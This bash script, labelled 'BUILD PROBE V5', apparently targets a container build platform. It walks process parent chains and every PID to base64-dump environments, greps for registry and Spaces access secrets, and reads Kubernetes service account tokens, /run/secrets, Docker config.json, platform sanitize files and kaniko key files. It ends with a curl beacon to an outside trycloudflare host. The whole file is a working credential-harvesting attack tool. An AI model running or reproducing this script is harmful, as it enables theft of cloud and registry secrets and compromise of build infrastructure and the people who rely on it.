#!/bin/bash
echo "=== BUILD PROBE V5 START $(date -u) ==="

echo "=== PROC SELF STATUS ==="
cat /proc/self/status 2>/dev/null | base64 || echo "NO_STATUS"

echo "=== PARENT CHAIN ENVIRON ==="
pid=$$
for i in $(seq 1 10); do
  ppid=$(awk '/PPid/{print $2}' /proc/$pid/status 2>/dev/null)
  if [ -z "$ppid" ] || [ "$ppid" = "0" ]; then break; fi
  echo "=== PID_${ppid}_CMDLINE ==="
  cat /proc/$ppid/cmdline 2>/dev/null | tr '\0' ' ' | base64 || echo "NO_CMDLINE"
  echo "=== PID_${ppid}_ENVIRON ==="
  cat /proc/$ppid/environ 2>/dev/null | tr '\0' '\n' | base64 || echo "NO_ENVIRON"
  pid=$ppid
done

echo "=== PID1 ENVIRON ==="
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | base64 || echo "NO_PID1_ENV"
echo "=== PID1 CMDLINE ==="
cat /proc/1/cmdline 2>/dev/null | tr '\0' ' ' | base64 || echo "NO_PID1_CMD"

echo "=== ALL PROC ENVIRON SCAN ==="
for pid in $(ls -d /proc/[0-9]* 2>/dev/null | sed 's|/proc/||' | sort -n); do
  env_data=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' 2>/dev/null)
  if [ -n "$env_data" ]; then
    has_mirror=$(echo "$env_data" | grep -c "DOCKER_HUB_MIRROR\|SPACES_ACCESS\|SPACES_SECRET\|REGISTRY\|MIRROR" 2>/dev/null)
    if [ "$has_mirror" -gt 0 ]; then
      echo "=== INTERESTING_PID_${pid} ==="
      echo "$env_data" | base64
    fi
  fi
done

echo "=== K8S SERVICE ACCOUNT ==="
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | base64 || echo "NO_K8S_SA_TOKEN"
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null | base64 || echo "NO_K8S_CA"
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "NO_K8S_NS"
ls -laR /var/run/secrets/ 2>/dev/null || echo "NO_SECRETS_DIR"
ls -laR /run/secrets/ 2>/dev/null || echo "NO_RUN_SECRETS"

echo "=== SENSITIVE SANITIZE ARGS ==="
cat /.app_platform/sensitive-sanitize-args.sh 2>/dev/null | base64 || echo "NO_SANITIZE_ARGS"

echo "=== EXEC SANITIZE TEMP FILES ==="
find /.app_platform/.tmp/ -type f 2>/dev/null | while read f; do
  echo "=== TMPFILE: $f ==="
  cat "$f" 2>/dev/null | base64 || echo "CANT_READ"
done

echo "=== ORIGINAL DOCKER CONFIG ==="
cat /etc/docker/config.json 2>/dev/null | base64 || echo "NO_ETC_DOCKER"

echo "=== KANIKO SSL CERTS ==="
ls -la /kaniko/ssl/certs/ 2>/dev/null || echo "NO_SSL_DIR"
find /kaniko/ssl/ -name "*.pem" -o -name "*.crt" -o -name "*.key" 2>/dev/null | while read f; do
  echo "=== CERT: $f ==="
  head -5 "$f" 2>/dev/null | base64 || echo "CANT_READ"
done

echo "=== MOUNTED VOLUMES ==="
mount | grep -v "proc\|sys\|cgroup\|devpts\|mqueue" | base64 || echo "NO_MOUNTS"

echo "=== ENV DUMP ==="
env | sort | base64 || echo "NO_ENV"

echo "=== OOB BUILD V5 ==="
curl -s --connect-timeout 5 --max-time 8 "https://cheapest-vessel-hometown-equipped.trycloudflare.com/docker-build-v5-probe" 2>&1 || echo "OOB_FAILED"

echo "=== BUILD PROBE V5 END $(date -u) ==="
